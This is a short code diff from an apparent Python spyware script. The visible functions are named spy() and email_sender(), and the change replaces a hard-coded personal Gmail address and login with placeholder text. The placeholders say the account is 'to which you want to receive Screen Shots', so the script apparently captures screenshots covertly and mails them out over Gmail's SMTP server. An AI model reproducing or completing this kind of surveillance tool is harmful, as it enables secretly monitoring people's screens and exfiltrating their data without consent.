@@ -17,7 +17,7 @@ def spy():
 
 def email_sender():
     From = 'admin@example.com'
-    To = 'aleemasgher@gmail.com'
+    To = 'Your Gmail Account'
     msg = MIMEMultipart()
     msg['From'] = From
     msg['To'] = To
@@ -25,7 +25,7 @@ def email_sender():
     try:
         smtp = smtplib.SMTP('smtp.gmail.com:587')
         smtp.starttls()
-        smtp.login('aleemasgher@gmail.com', '')
+        smtp.login('your gmail account to which you want to receive Screen Shots ', 'Password of that account')
     except:
         i = 1
     else:
